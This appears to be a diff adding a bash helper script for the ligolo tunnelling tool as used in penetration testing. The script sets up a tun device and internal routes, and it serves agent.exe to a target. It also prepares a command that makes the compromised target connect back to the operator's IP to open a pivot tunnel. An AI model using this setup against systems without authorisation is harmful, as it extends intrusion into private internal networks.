@@ -1,0 +1,56 @@
+#! /bin/bash
+
+echo ""
+if [ ! -f proxy ]; then
+	echo "[!] run this in a location where you have all ligolo files (proxy and agent) stored."
+	exit 1
+fi
+
+echo "Setup:"
+echo "------"
+
+exists=$( ip a | grep ligolo ) 
+if [[ $exists == ""  ]]; then
+	echo "[*] Setting up ligolo device ... (needs sudo permissions)"
+	echo "    sudo ip tuntap add user kali mode tun ligolo"
+	sudo ip tuntap add user kali mode tun ligolo
+	echo "    sudo ip link set ligolo up"
+	sudo ip link set ligolo up
+	echo "    Done."
+else
+	echo "[*] ligolo device already set up."
+fi
+
+read -p "[?] Internal IP range (leave blank if still unknown): " cidr
+if [[ $cidr == "" ]]; then
+	echo "[!] Once a session is established:"
+	echo "    1. Check agent's network configuration with 'ifconfig'"
+	echo "    2. Set route with 'sudo ip route add <ip-range> dev ligolo'"
+else
+	echo "[*] Adding route ..."
+	echo "    sudo ip route add $cidr dev ligolo"
+	sudo ip route add $cidr dev ligolo
+fi
+
+read -p "[?] Serve agent.exe? (y/N): " yesno
+
+if [[ $yesno == "y" ]]; then
+	echo "[*] serving agent.exe ..."
+	echo "    (once done: stop with CTRL+C)"
+	serve agent.exe
+fi
+
+echo ""
+echo "Tunneling:"
+echo "----------"
+echo -n "agent.exe -connect $( tun0 ):11601 -ignore-cert" | xclip -selection c
+echo "[!] Todo manually:"
+echo "    1. On target: connect with: .\agent.exe -connect $( tun0 ):11601 -ignore-cert (copied to clipboard)"
+echo "    2. Here: wait for connection -> type 'session' -> press enter -> type 'start'"
+if [[ $cidr == "" ]]; then
+	echo "    3. Add internal route (see above in 'setup' section)"
+fi
+echo "[*] Starting proxy ..."
+echo ""
+
+./proxy -selfcert
